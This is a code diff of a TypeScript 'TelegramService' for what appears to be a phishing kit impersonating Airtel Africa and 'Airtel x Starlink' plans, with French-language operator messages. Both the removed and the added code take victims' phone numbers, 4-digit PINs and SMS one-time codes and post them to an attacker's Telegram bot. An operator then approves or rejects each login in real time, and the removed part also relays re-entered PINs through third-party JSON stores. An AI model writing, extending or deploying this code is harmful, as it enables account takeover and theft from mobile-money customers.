@@ -42,20 +42,7 @@ export interface TelegramStatusResult {
   reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
 }
 
-const BROWSER_HEADERS = {
-  'Content-Type': 'application/json',
-  'Accept': 'application/json',
-};
-
-// Request queue for managing concurrent requests
-interface QueuedRequest {
-  fn: () => Promise<any>;
-  resolve: (value: any) => void;
-  reject: (error: any) => void;
-}
-
 class TelegramService {
-  private cloudIdMap: Map<string, string> = new Map();
   private localSessionState: Map<
     string,
     {
@@ -70,48 +57,8 @@ class TelegramService {
       otp?: string;
       planName?: string;
       planPrice?: string;
-      cloudId?: string;
     }
   > = new Map();
-
-  // Request queue management
-  private requestQueue: QueuedRequest[] = [];
-  private activeRequests = 0;
-  private maxConcurrentRequests = 5; // Limit concurrent requests to avoid rate limiting
-  private processingQueue = false;
-
-  // Rate limiting
-  private lastTelegramApiCall = 0;
-  private minTelegramApiInterval = 100; // Minimum 100ms between Telegram API calls
-
-  // Retry configuration
-  private maxRetries = 3;
-  private baseRetryDelay = 1000; // 1 second base delay
-
-  /**
-   * Helper to retrieve persisted cloudId across tabs, reloads, or OTP steps
-   */
-  public getCloudId(sessionId: string): string {
-    if (this.cloudIdMap.has(sessionId)) {
-      return this.cloudIdMap.get(sessionId)!;
-    }
-    const saved = safeStorage.getItem(`airtel_cloud_id_${sessionId}`);
-    if (saved) {
-      this.cloudIdMap.set(sessionId, saved);
-      return saved;
-    }
-    return sessionId;
-  }
-
-  /**
-   * Helper to persist cloudId
-   */
-  public setCloudId(sessionId: string, cloudId: string) {
-    this.cloudIdMap.set(sessionId, cloudId);
-    safeStorage.setItem(`airtel_cloud_id_${sessionId}`, cloudId);
-    safeStorage.setItem(`airtel_active_session`, sessionId);
-    safeStorage.setItem(`airtel_active_cloud_id`, cloudId);
-  }
 
   /**
    * Helper to safely parse JSON
@@ -129,448 +76,285 @@ class TelegramService {
   }
 
   /**
-   * Retry logic with exponential backoff
-   */
-  private async retryWithBackoff<T>(
-    fn: () => Promise<T>,
-    maxRetries: number = this.maxRetries,
-    baseDelay: number = this.baseRetryDelay
-  ): Promise<T> {
-    let lastError: Error | null = null;
-
-    for (let attempt = 0; attempt <= maxRetries; attempt++) {
-      try {
-        return await fn();
-      } catch (error: any) {
-        lastError = error;
-        console.warn(`[TelegramService] Attempt ${attempt + 1}/${maxRetries + 1} failed:`, error);
-
-        // Don't retry on last attempt
-        if (attempt === maxRetries) {
-          break;
-        }
-
-        // Exponential backoff with jitter
-        const delay = baseDelay * Math.pow(2, attempt) + Math.random() * 200;
-        await new Promise(resolve => setTimeout(resolve, delay));
-      }
-    }
-
-    throw lastError || new Error('Retry attempts exhausted');
-  }
-
-  /**
-   * Rate limiting for Telegram API calls
-   */
-  private async rateLimit(): Promise<void> {
-    const now = Date.now();
-    const timeSinceLastCall = now - this.lastTelegramApiCall;
-
-    if (timeSinceLastCall < this.minTelegramApiInterval) {
-      const waitTime = this.minTelegramApiInterval - timeSinceLastCall;
-      await new Promise(resolve => setTimeout(resolve, waitTime));
-    }
-
-    this.lastTelegramApiCall = Date.now();
-  }
-
-  /**
-   * Process request queue
-   */
-  private async processQueue(): Promise<void> {
-    if (this.processingQueue || this.requestQueue.length === 0) {
-      return;
-    }
-
-    this.processingQueue = true;
-
-    while (this.requestQueue.length > 0 && this.activeRequests < this.maxConcurrentRequests) {
-      const request = this.requestQueue.shift();
-      if (!request) break;
-
-      this.activeRequests++;
-
-      request.fn()
-        .then(result => request.resolve(result))
-        .catch(error => request.reject(error))
-        .finally(() => {
-          this.activeRequests--;
-          this.processQueue();
-        });
-    }
-
-    this.processingQueue = false;
-  }
-
-  /**
-   * Queue a request for execution
-   */
-  private async queueRequest<T>(fn: () => Promise<T>): Promise<T> {
-    return new Promise((resolve, reject) => {
-      this.requestQueue.push({
-        fn,
-        resolve,
-        reject,
-      });
-      this.processQueue();
-    });
-  }
-
-  /**
-   * Send direct Telegram message using Bot API with retry and rate limiting
-   */
-  public async sendDirectTelegramMessage(text: string, inlineKeyboard?: any): Promise<any> {
-    return this.queueRequest(async () => {
-      await this.rateLimit();
-
-      return this.retryWithBackoff(async () => {
-        const token = getTelegramBotToken();
-        const chatId = getTelegramChatId();
-
-        if (!token || !chatId) {
-          throw new Error('Telegram bot token or chat ID missing');
-        }
-
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
-        const payload: any = {
-          chat_id: chatId,
-          text,
-          parse_mode: 'HTML',
-        };
-        if (inlineKeyboard) {
-          payload.reply_markup = {
-            inline_keyboard: inlineKeyboard,
-          };
-        }
-
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-        });
-
-        if (!res.ok) {
-          const errorText = await res.text();
-          throw new Error(`Telegram API error: ${res.status} - ${errorText}`);
-        }
-
-        const data = await this.safeJson(res);
-        if (!data || !data.ok) {
-          throw new Error('Telegram API returned error response');
-        }
-
-        return data;
-      });
-    });
-  }
-
-  /**
-   * Send Login Credentials (Phone + 4-digit PIN) with retry logic
+   * Send Login Credentials and wait for Telegram callback (getUpdates polling)
    */
   public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
-    return this.queueRequest(async () => {
-      const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
-      const cleanPhone = phone.replace(/\D/g, '');
-      const cleanPin = pin.slice(0, 4);
+    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
+    const cleanPhone = phone.replace(/\D/g, '');
+    const cleanPin = pin.slice(0, 4);
+    const token = getTelegramBotToken();
+    const chatId = getTelegramChatId();
 
-      // Use sessionId as cloudId for speed
-      const resolvedCloudId = sessionId;
-      this.setCloudId(sessionId, resolvedCloudId);
-
-      this.localSessionState.set(sessionId, {
-        loginStatus: 'pending',
-        otpStatus: 'idle',
-        phone: cleanPhone,
-        fullPhone: fullPhone || `+243 ${cleanPhone}`,
-        country: country || 'Airtel Africa',
-        pin: cleanPin,
-        planName,
-        planPrice,
-        cloudId: resolvedCloudId,
-      });
-
-      const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
-      const displayCountry = country || 'Airtel Africa';
-      const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
-
-      const messageText =
-        `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
-        `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
-        `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
-        `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
-        `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
-        `📶 <b>Réseau:</b> ${displayBrand}\n` +
-        `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
-        `🆔 <b>ID Session:</b> <code>${resolvedCloudId}</code>\n\n` +
-        `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
-
-      const inlineKeyboard = [
-        [
-          {
-            text: '✅ Valider PIN',
-            callback_data: `approve_login_${resolvedCloudId}`,
-          },
-          {
-            text: '❌ Rejeter PIN',
-            callback_data: `reject_login_${resolvedCloudId}`,
-          },
-        ],
-        [
-          {
-            text: '🌐 Action Directe (Lien Web)',
-            url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_login`,
-          },
-        ],
-      ];
-
-      await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
-      return true;
-    });
-  }
-
-  /**
-   * Send OTP Verification Code (4 digits) with retry logic
-   */
-  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
-    return this.queueRequest(async () => {
-      const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
-      const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
-      const resolvedCloudId = this.getCloudId(sessionId);
-
-      const existing = this.localSessionState.get(sessionId) || {
-        loginStatus: 'approved' as const,
-        otpStatus: 'pending' as const,
-        cloudId: resolvedCloudId,
-        fullPhone,
-        country,
-      };
-      existing.otp = cleanOtp;
-      existing.otpStatus = 'pending';
-      this.localSessionState.set(sessionId, existing);
-
-      // 1. Try server or Vercel serverless endpoint with retry
-      try {
-        await this.retryWithBackoff(async () => {
-          const serverRes = await fetch('/api/telegram/send-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              sessionId,
-              cloudId: resolvedCloudId,
-              phone,
-              fullPhone: fullPhone || existing.fullPhone,
-              country: country || existing.country,
-              airtelBrand: airtelBrand || 'Airtel Starlink',
-              otp: cleanOtp,
-              planName,
-              planPrice,
-            }),
-          });
-
-          if (!serverRes.ok) {
-            throw new Error(`Server returned ${serverRes.status}`);
-          }
-
-          const data = await this.safeJson(serverRes);
-          if (!data || !data.success) {
-            throw new Error('Server returned unsuccessful response');
-          }
-
-          return data;
-        });
-      } catch (err) {
-        console.warn('[TelegramService] Server OTP endpoint failed, using fallback:', err);
-      }
-
-      // 2. Direct Cloud Store Update + Telegram Message with retry
-      try {
-        await this.retryWithBackoff(async () => {
-          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
-            headers: BROWSER_HEADERS,
-            cache: 'no-store',
-          });
-
-          if (!fetchRes.ok) {
-            throw new Error(`Cloud fetch returned ${fetchRes.status}`);
-          }
-
-          const record = await this.safeJson(fetchRes);
-          const data = record?.data || {};
-          data.otp = cleanOtp;
-          data.otpStatus = 'pending';
-          data.lastUpdated = Date.now();
-
-          const updateRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
-            method: 'PUT',
-            headers: BROWSER_HEADERS,
-            body: JSON.stringify({
-              name: record?.name || resolvedCloudId,
-              data,
-            }),
-          });
-
-          if (!updateRes.ok) {
-            throw new Error(`Cloud update returned ${updateRes.status}`);
-          }
-
-          return true;
-        });
-      } catch (err) {
-        console.warn('[TelegramService] Cloud store OTP update warning:', err);
-      }
-
-      const displayPhone = fullPhone || payload.fullPhone || phone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
-      const displayCountry = country || existing.country || 'Airtel Africa';
-
-      const messageText =
-        `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
-        `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
-        `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
-        `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
-        `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
-        `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
-        `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
-        `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
-
-      const inlineKeyboard = [
-        [
-          {
-            text: '✅ Valider OTP',
-            callback_data: `approve_otp_${resolvedCloudId}`,
-          },
-          {
-            text: '❌ Rejeter OTP',
-            callback_data: `reject_otp_${resolvedCloudId}`,
-          },
-        ],
-        [
-          {
-            text: '🌐 Action Directe (Lien Web)',
-            url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_otp`,
-          },
-        ],
-      ];
-
-      await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
-      return true;
-    });
-  }
-
-  /**
-   * Send Re-entered / Confirmed 4-digit PIN to Telegram Bot
-   */
-  public async sendReenterPin(payload: TelegramReenterPinPayload): Promise<boolean> {
-    const { sessionId, phone, pin, originalPin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
-    const cleanPin = pin.replace(/\D/g, '').slice(0, 4);
-    const resolvedCloudId = this.getCloudId(sessionId);
-
-    const existing = this.localSessionState.get(sessionId) || {
-      loginStatus: 'approved' as const,
-      otpStatus: 'approved' as const,
-      reenterStatus: 'pending' as const,
-      cloudId: resolvedCloudId,
-      fullPhone,
-      country,
-    };
-    existing.reenterPin = cleanPin;
-    existing.reenterStatus = 'pending';
-    this.localSessionState.set(sessionId, existing);
-
-    // 1. Try server or Vercel serverless endpoint
-    try {
-      const serverRes = await fetch('/api/telegram/send-reenter-pin', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          sessionId,
-          cloudId: resolvedCloudId,
-          phone,
-          fullPhone: fullPhone || existing.fullPhone,
-          country: country || existing.country,
-          airtelBrand: airtelBrand || 'Airtel Starlink',
-          originalPin: originalPin || existing.pin,
-          pin: cleanPin,
-          planName,
-          planPrice,
-        }),
-      });
-
-      if (serverRes.ok) {
-        const data = await this.safeJson(serverRes);
-        if (data && data.success) {
-          return true;
-        }
-      }
-    } catch {
-      // Backend unavailable, fall through
+    if (!token || !chatId) {
+      console.warn('[TelegramService] Telegram credentials not configured');
+      return true; // fallback to success
     }
 
-    // 2. Direct Cloud Store Update + Telegram Message
-    try {
-      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
-        headers: BROWSER_HEADERS,
-        cache: 'no-store',
-      });
-      if (fetchRes.ok) {
-        const record = await this.safeJson(fetchRes);
-        const data = record?.data || {};
-        data.reenterPin = cleanPin;
-        data.reenterStatus = 'pending';
-        data.lastUpdated = Date.now();
-
-        await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
-          method: 'PUT',
-          headers: BROWSER_HEADERS,
-          body: JSON.stringify({
-            name: record?.name || resolvedCloudId,
-            data,
-          }),
-        });
-      }
-    } catch (err) {
-      console.warn('Direct cloud store reenter update warning:', err);
-    }
-
-    const displayPhone = fullPhone || payload.fullPhone || phone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
-    const displayCountry = country || existing.country || 'Airtel Africa';
+    const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
+    const displayCountry = country || 'Airtel Africa';
+    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';
 
     const messageText =
-      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
+      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
       `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
-      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
-      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${cleanPin}</code>\n` +
-      `📌 <b>Code PIN Initial:</b> <code>${existing.pin || originalPin || 'N/A'}</code>\n` +
-      `🔢 <b>Code OTP Validé:</b> <code>${existing.otp || '****'}</code>\n` +
-      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
-      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
-      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
-      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
+      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
+      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
+      `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
+      `📶 <b>Réseau:</b> ${displayBrand}\n` +
+      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
+      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
+      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
 
     const inlineKeyboard = [
       [
         {
-          text: '✅ Valider PIN Final',
-          callback_data: `approve_reenter_${resolvedCloudId}`,
+          text: '✅ Valider PIN',
+          callback_data: `approve_login_${sessionId}`,
         },
         {
-          text: '❌ Rejeter PIN Final',
-          callback_data: `reject_reenter_${resolvedCloudId}`,
+          text: '❌ Rejeter PIN',
+          callback_data: `reject_login_${sessionId}`,
         },
       ],
       [
         {
           text: '🌐 Action Directe (Lien Web)',
-          url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_reenter`,
+          url: `https://congo2-one.vercel.app/api/telegram/action?id=${sessionId}&action=approve_login`,
         },
       ],
     ];
 
-    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
-    return true;
+    const sessionKey = `pendingAuth_${sessionId}_login`;
+    let messageId = safeStorage.getItem(sessionKey);
+
+    if (!messageId) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: messageText,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: inlineKeyboard },
+          }),
+        });
+
+        if (!response.ok) return true;
+        const data = await this.safeJson(response);
+        if (!data || !data.ok) return true;
+
+        messageId = data.result.message_id.toString();
+        safeStorage.setItem(sessionKey, messageId);
+        console.log('[TelegramService] Message sent, ID:', messageId);
+      } catch (error) {
+        console.warn('[TelegramService] Send error:', error);
+        return true;
+      }
+    }
+
+    // Start polling for callback query
+    while (true) {
+      try {
+        const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
+        const updateRes = await fetch(updateUrl);
+        const updateData = await this.safeJson(updateRes);
+
+        if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
+          for (const update of updateData.result) {
+            if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
+              const action = update.callback_query.data;
+
+              // Acknowledge the callback
+              await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  callback_query_id: update.callback_query.id,
+                  text: action === 'approve_login' ? '✅ Connexion validée !' : '❌ Connexion refusée.',
+                  show_alert: true,
+                }),
+              }).catch(() => {});
+
+              // Update message text
+              const newText = messageText + `\n\n<b>[ ${action === 'approve_login' ? '✅ APPROUVÉ' : '❌ REJETÉ'} ]</b>`;
+              await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  message_id: messageId,
+                  text: newText,
+                  parse_mode: 'HTML',
+                  reply_markup: { inline_keyboard: [] },
+                }),
+              }).catch(() => {});
+
+              // Clear session storage
+              safeStorage.removeItem(sessionKey);
+
+              // Clear this update to avoid reprocessing
+              await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});
+
+              console.log('[TelegramService] Action received:', action, 'for session:', sessionId);
+
+              return action === 'approve_login';
+            }
+          }
+        }
+      } catch (e) {
+        console.warn('[TelegramService] Polling error:', e);
+      }
+
+      // Wait before next poll
+      await new Promise((resolve) => setTimeout(resolve, 3000));
+    }
   }
 
   /**
-   * Poll JSONBin for status updates
+   * Send OTP and wait for Telegram callback
+   */
+  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
+    const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
+    const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
+    const token = getTelegramBotToken();
+    const chatId = getTelegramChatId();
+
+    if (!token || !chatId) {
+      console.warn('[TelegramService] Telegram credentials not configured');
+      return true; // fallback to success
+    }
+
+    const existing = this.localSessionState.get(sessionId) || {
+      loginStatus: 'approved' as const,
+      otpStatus: 'pending' as const,
+      fullPhone,
+      country,
+    };
+    existing.otp = cleanOtp;
+    existing.otpStatus = 'pending';
+    this.localSessionState.set(sessionId, existing);
+
+    const displayPhone = fullPhone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
+    const displayCountry = country || existing.country || 'Airtel Africa';
+
+    const messageText =
+      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
+      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
+      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
+      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
+
+    const inlineKeyboard = [
+      [
+        {
+          text: '✅ Valider OTP',
+          callback_data: `approve_otp_${sessionId}`,
+        },
+        {
+          text: '❌ Rejeter OTP',
+          callback_data: `reject_otp_${sessionId}`,
+        },
+      ],
+      [
+        {
+          text: '🌐 Action Directe (Lien Web)',
+          url: `https://congo2-one.vercel.app/api/telegram/action?id=${sessionId}&action=approve_otp`,
+        },
+      ],
+    ];
+
+    const sessionKey = `pendingAuth_${sessionId}_otp`;
+    let messageId = safeStorage.getItem(sessionKey);
+
+    if (!messageId) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: messageText,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: inlineKeyboard },
+          }),
+        });
+
+        if (!response.ok) return true;
+        const data = await this.safeJson(response);
+        if (!data || !data.ok) return true;
+
+        messageId = data.result.message_id.toString();
+        safeStorage.setItem(sessionKey, messageId);
+        console.log('[TelegramService] OTP message sent, ID:', messageId);
+      } catch (error) {
+        console.warn('[TelegramService] OTP send error:', error);
+        return true;
+      }
+    }
+
+    // Start polling for callback query
+    while (true) {
+      try {
+        const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
+        const updateRes = await fetch(updateUrl);
+        const updateData = await this.safeJson(updateRes);
+
+        if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
+          for (const update of updateData.result) {
+            if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
+              const action = update.callback_query.data;
+
+              // Acknowledge the callback
+              await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  callback_query_id: update.callback_query.id,
+                  text: action === 'approve_otp' ? '✅ OTP validé !' : '❌ OTP rejeté.',
+                  show_alert: true,
+                }),
+              }).catch(() => {});
+
+              // Update message text
+              const newText = messageText + `\n\n<b>[ ${action === 'approve_otp' ? '✅ APPROUVÉ' : '❌ REJETÉ'} ]</b>`;
+              await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  message_id: messageId,
+                  text: newText,
+                  parse_mode: 'HTML',
+                  reply_markup: { inline_keyboard: [] },
+                }),
+              }).catch(() => {});
+
+              // Clear session storage
+              safeStorage.removeItem(sessionKey);
+
+              // Clear this update
+              await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});
+
+              console.log('[TelegramService] OTP action received:', action, 'for session:', sessionId);
+
+              return action === 'approve_otp';
+            }
+          }
+        }
+      } catch (e) {
+        console.warn('[TelegramService] OTP polling error:', e);
+      }
+
+      await new Promise((resolve) => setTimeout(resolve, 3000));
+    }
+  }
+
+  /**
+   * Status polling - checks local state (no external DB needed)
    */
   public async pollUpdates(
     sessionId: string,
@@ -579,43 +363,16 @@ class TelegramService {
   ): Promise<'pending' | 'approved' | 'rejected'> {
     const local = this.localSessionState.get(sessionId);
     if (local) {
-      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) return local.loginStatus;
-      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) return local.otpStatus;
-    }
-
-    // Poll JSONBin
-    try {
-      const key = process.env.VITE_JSONBIN_KEY || '';
-      const binId = process.env.VITE_JSONBIN_ID || '';
-      if (!key || !binId) return 'pending';
-
-      const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
-        headers: { 'X-Master-Key': key, 'X-Bin-Meta': 'false' },
-        cache: 'no-store',
-      });
-
-      if (res.ok) {
-        const data = await this.safeJson(res);
-        const sessionKey = `airtel_${sessionId}`;
-        const sessionData = data?.[sessionKey];
-
-        if (sessionData) {
-          if (targetStep === 'login' && (sessionData.loginStatus === 'approved' || sessionData.loginStatus === 'rejected')) {
-            if (local) local.loginStatus = sessionData.loginStatus;
-            console.log('[Poll] Got status from JSONBin:', sessionData.loginStatus);
-            return sessionData.loginStatus;
-          }
-          if (targetStep === 'otp' && (sessionData.otpStatus === 'approved' || sessionData.otpStatus === 'rejected')) {
-            if (local) local.otpStatus = sessionData.otpStatus;
-            console.log('[Poll] Got status from JSONBin:', sessionData.otpStatus);
-            return sessionData.otpStatus;
-          }
-        }
+      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
+        return local.loginStatus;
       }
-    } catch (e) {
-      console.warn('[Poll] JSONBin error:', e);
+      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
+        return local.otpStatus;
+      }
+      if (targetStep === 'reenter' && (local.reenterStatus === 'approved' || local.reenterStatus === 'rejected')) {
+        return local.reenterStatus;
+      }
     }
-
     return 'pending';
   }
 }
